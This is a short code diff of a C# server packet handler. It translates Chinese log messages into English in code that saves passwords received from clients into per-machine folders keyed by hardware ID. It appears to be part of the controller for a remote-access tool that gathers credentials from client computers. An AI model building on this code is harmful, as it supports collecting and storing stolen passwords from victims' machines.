@@ -22,12 +22,12 @@ namespace Server.Handle_Packet
                 if (!Directory.Exists(fullPath))
                     Directory.CreateDirectory(fullPath);
                 File.WriteAllText(fullPath + $"\\Password_{DateTime.Now:MM-dd-yyyy HH;mm;ss}.txt", password);
-                new HandleLogs().Addmsg($"客户端 {client.Ip} 密码保存成功，文件保存在 @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/Password", Color.Purple);
+                new HandleLogs().Addmsg($"Client {client.Ip} password saved success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/Password", Color.Purple);
                 client.Disconnected();
             }
             catch (Exception ex)
             {
-                new HandleLogs().Addmsg($"密码保存错误: {ex.Message}", Color.Red);
+                new HandleLogs().Addmsg($"Password saved error: {ex.Message}", Color.Red);
             }
         }
     }
